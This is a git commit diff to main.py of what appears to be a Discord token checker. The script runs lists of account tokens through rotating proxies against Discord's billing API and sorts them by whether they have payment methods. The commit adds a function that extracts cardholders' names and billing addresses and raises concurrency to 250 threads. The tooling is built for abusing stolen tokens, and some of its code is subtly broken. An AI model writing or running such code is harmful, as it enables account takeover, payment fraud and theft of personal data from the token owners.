8dd0a64dca4441e3c529074a28b436d07df593a1
qoft <63415260+qoft@users.noreply.github.com>
2022-09-01 15:49:23 -0400

    oops

--- main.py
+++ main.py
@@ -8,10 +8,53 @@ import colorama
 import concurrent.futures
 
 i = 0
-
+__lock__ = threading.Lock()
 colorama.init(convert=True)
 
 proxy_iter = cycle(open("proxies.txt").read().splitlines())
+
+def get_payment_addresses(token, proxy):
+    headers = {
+                "authorization": token,
+                "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDA2Iiwib3NfdmVyc2lvbiI6IjEwLjAuMjIwMDAiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTQ0MDU3LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9006 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36"
+            }
+
+    methods = {}
+
+    payment_info = httpx.get(
+        'https://discord.com/api/v9/users/@me/billing/payment-sources',
+        headers=headers,
+        proxies=proxy
+    ).json()
+    if payment_info.status_code == 403:
+        return [[], []]
+
+    names = []
+    addresses = []
+
+    for payment in payment_info:
+        if payment['billing_address']['name'] is not None:
+            names.append(payment['billing_address']['name'])
+
+        address = ""
+
+        if payment['billing_address']['line_1'] is not None:
+            address += payment['billing_address']['line_1']
+
+        if payment['billing_address']['line_2'] is not None:
+            address += " " + payment['billing_address']['line_2']
+
+        if payment['billing_address']['city'] is not None:
+            address += " " + payment['billing_address']['city']
+
+        if payment['billing_address']['postal_code'] is not None:
+            address += " " + payment['billing_address']['postal_code']
+
+        addresses.append(address)
+
+    return [names, addresses]
+
 
 
 def has_billing(token: str) -> bool:
@@ -20,20 +63,8 @@ def has_billing(token: str) -> bool:
         proxies = {
             "https://": f"http://{proxy}",
         }
-        client = httpx.Client(proxies=proxies)
-        resp = client.get(
-            url="https://discord.com/api/v9/users/@me/billing/payment-sources",
-            headers={
-                "authorization": token,
-                "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDA2Iiwib3NfdmVyc2lvbiI6IjEwLjAuMjIwMDAiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTQ0MDU3LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==",
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9006 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36"
-            },
-            timeout=5
-        )
-        if resp.status_code == 200:
-            for source in resp.json() and len(resp.json()):
-                if source["invalid"]:
-                    return False
+        d = get_payment_addresses(token, proxies)
+        if d[0] != [] and d[1] != []:
             return True
         return False
 
@@ -45,11 +76,13 @@ def check_token(token: str) -> None:
     if check:
         with open("tokens/billing.txt", "a") as f:
             f.write(f"{token}\n")
-        print(f"[{i}] {colorama.Fore.GREEN}{token[0:-54]} has billing")
+        with __lock__:
+            print(f"[{i}] {colorama.Fore.GREEN}{token[0:-54]} has billing")
     else:
         with open("tokens/non-billing.txt", "a") as f:
             f.write(f"{token}\n")
-        print(f"[{i}] {colorama.Fore.RED}{token[0:-54]} does not have billing")
+        with __lock__:
+            print(f"[{i}] {colorama.Fore.RED}{token[0:-54]} has no billing")
 
 
 tokens = []
@@ -66,7 +99,7 @@ with open("tokens/non-billing.txt", "w") as f:
     f.write("")
 
 
-with concurrent.futures.ThreadPoolExecutor() as executor:
+with concurrent.futures.ThreadPoolExecutor(max_workers=250) as executor:
     futures = []
     for token in tokens:
         futures.append(executor.submit(check_token, token=token))
